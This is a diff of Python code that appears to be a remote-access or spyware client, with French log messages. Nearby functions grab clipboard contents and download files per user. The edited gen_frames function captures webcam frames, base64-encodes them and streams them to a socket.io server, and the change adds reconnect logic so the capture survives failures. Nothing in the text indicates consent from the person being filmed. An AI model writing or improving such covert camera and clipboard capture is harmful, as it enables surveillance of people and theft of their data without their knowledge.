@@ -102,31 +102,41 @@ def get_clipboard_content(sio=None, user_id=None):
         print(f"Échec de la récupération du clipboard: {e}")
 
 
-def gen_frames(sio):
-    try:
-        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Using DirectShow
-        if not camera.isOpened():
-            raise ValueError("Failed to open webcam")
+def gen_frames(sio, reconnect_attempts=5, reconnect_delay=2):
+    attempt = 0
 
-        while True:
-            success, frame = camera.read()
-            if not success:
-                print("Failed to read frame from webcam")
-                break
-            else:
-                ret, buffer = cv2.imencode('.jpg', frame)
-                if not ret:
-                    print("Failed to encode frame")
-                    continue
-                frame_bytes = base64.b64encode(buffer)
-                sio.emit('webcam_response', {'data': frame_bytes.decode()})
+    while attempt < reconnect_attempts:
+        try:
+            camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Using DirectShow
+            if not camera.isOpened():
+                raise ValueError("Failed to open webcam")
 
-    except Exception as e:
-        gen_frames(sio)
-    finally:
-        if 'camera' in locals() and camera.isOpened():
-            camera.release()
-        cv2.destroyAllWindows()
+            while True:
+                success, frame = camera.read()
+                if not success:
+                    print("Failed to read frame from webcam")
+                    break
+                else:
+                    ret, buffer = cv2.imencode('.jpg', frame)
+                    if not ret:
+                        print("Failed to encode frame")
+                        continue
+                    frame_bytes = base64.b64encode(buffer)
+                    sio.emit('webcam_response', {'data': frame_bytes.decode()})
+
+        except Exception as e:
+            print(f"Exception in gen_frames: {e}")
+            attempt += 1
+            print(f"Reconnecting attempt {attempt}/{reconnect_attempts} in {reconnect_delay} seconds...")
+            time.sleep(reconnect_delay)
+        finally:
+            if 'camera' in locals() and camera.isOpened():
+                camera.release()
+            cv2.destroyAllWindows()
+
+        if attempt >= reconnect_attempts:
+            print("Max reconnection attempts reached. Exiting.")
+            break
 
 def download_file(file_path, sio, user_id):
     try:
